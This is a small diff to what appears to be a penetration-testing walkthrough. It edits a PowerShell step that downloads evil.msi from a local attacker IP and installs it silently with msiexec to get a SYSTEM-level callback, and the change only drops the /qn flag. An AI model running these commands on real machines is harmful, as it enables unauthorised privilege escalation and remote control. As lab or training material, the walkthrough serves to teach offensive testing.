@@ -126,7 +126,7 @@ Upload it to the target and fire it through `msiexec` with a listener waiting:
 
 ```powershell
 IWR http://192.168.45.244:443/evil.msi -UseBasicParsing -OutFile evil.msi
-msiexec /quiet /qn /i evil.msi
+msiexec /quiet /i evil.msi
 ```
 
 The installer executes with elevated privileges and the callback lands as `nt authority\system`.
